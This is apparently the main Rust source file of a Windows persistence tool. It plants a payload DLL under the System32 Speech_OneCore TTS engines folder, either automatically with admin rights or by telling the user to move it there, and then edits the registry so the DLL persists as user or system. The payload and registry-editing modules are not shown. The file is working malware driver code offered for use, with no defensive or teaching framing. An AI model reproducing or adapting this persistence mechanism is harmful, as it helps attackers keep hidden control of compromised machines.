use std::io;

use crate::{cli::Tui, helpers::{is_elevated, reg_edit}, payload::write_binary};

pub mod cli;
pub mod helpers;
pub mod log;
pub mod payload;

fn main() -> io::Result<()> {
    // Start terminal user interface
    let mut tui = Tui::new().unwrap();

    if tui.print_header().is_err() {
        println!("Unable to print header");
    }

    // Pick a deploy type
    let deploy_type = match tui.get_yes_no("Deploy dll automatically?"){
        Ok(d) => d,
        Err(_e) => {
            error!("Unable to get deploy type");
            return Ok(());
        }
    };

    // Check persistance type
    let user_persist = match tui.get_yes_no("Persist as user?"){
        Ok(d) => d,
        Err(_e) => {
            error!("Unable to get persistance type");
            return Ok(());
        }
    };

    // Deploy dll
    if deploy_type {
        if !is_elevated() {
            error!("To auto deply you need to have admin rights");
            return Ok(());
        }

        match write_binary(r"C:\Windows\System32\Speech_OneCore\Engines\TTS") {
            Ok(_) => {
                info!("DLL deployed");
            }
            Err(_) => {
                error!("Unable to deploy dll");
                return Ok(());
            }
        }
    } else {
        match write_binary(r".") {
            Ok(_) => {
                tui.println("Dll written to current directory")?;
                tui.println(r"Move DLL to: C:\Windows\System32\Speech_OneCore\Engines\TT")?; 

                tui.println("Press enter after dll deploy (Enter) ")?;
                let mut input = String::new();
                io::stdin().read_line(&mut input).unwrap();
                tui.clear_content()?;
            }
            Err(_) => {
                error!("Unable to deploy dll");
                return Ok(());
            }
        }
    }

    match reg_edit(user_persist) {
        Ok(_) => {
            info!("Regestry updated");
        }
        Err(_) => {
            error!("Unable to update regestry");
            return Ok(());
        }
    }

    return Ok(());
}
